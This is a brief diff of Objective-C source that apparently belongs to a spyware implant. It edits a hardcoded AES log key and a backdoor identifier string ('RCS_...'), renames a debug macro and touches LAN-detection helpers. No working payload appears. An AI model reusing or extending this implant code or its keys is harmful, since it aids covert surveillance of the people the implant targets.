@@ -26,7 +26,7 @@
 #ifndef DEV_MODE
 char  gLogAesKey[]      = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // default
 #else
-char  gLogAesKey[]      = "cicuvDYvl9jZMH5QS26cEAijS8QqIfCX";
+char  gLogAesKey[]      = "-E18Yzo70cIDgzV4MRriFpJn4TOL0E23";
 #endif
 
 #ifndef DEV_MODE
@@ -40,7 +40,7 @@ char gInstanceId[]  = "bg5etG87q20Kg52W5Fg1";
 
 // Backdoor ID (16 bytes) (NULL terminated)
 #ifndef DEV_MODE
-char gBackdoorID[]  = "av3pVck1gb4eR2d8";
+char gBackdoorID[]  = "av3pVck1gb4eR2d8"; // default
 #else
 char gBackdoorID[16]  = "RCS_0000000307";
 #endif
@@ -305,7 +305,7 @@ BOOL isAddressOnLan(struct in_addr ipAddress)
     }
   else
     {
-#ifdef DEBUG_COMMON_ERRORS
+#ifdef DEBUG_COMMON
       errorLog(ME, @"Error while querying network interfaces");
 #endif
     }
@@ -322,7 +322,7 @@ BOOL isAddressAlreadyDetected(NSString *ipAddress,
   id anObject;
   
   while (anObject = [enumerator nextObject])
-    { 
+    {
       if ([[anObject objectForKey: @"ip"] isEqualToString: ipAddress])
         {
           if ((aPort == 0 || [[anObject objectForKey: @"port"] intValue] == aPort)
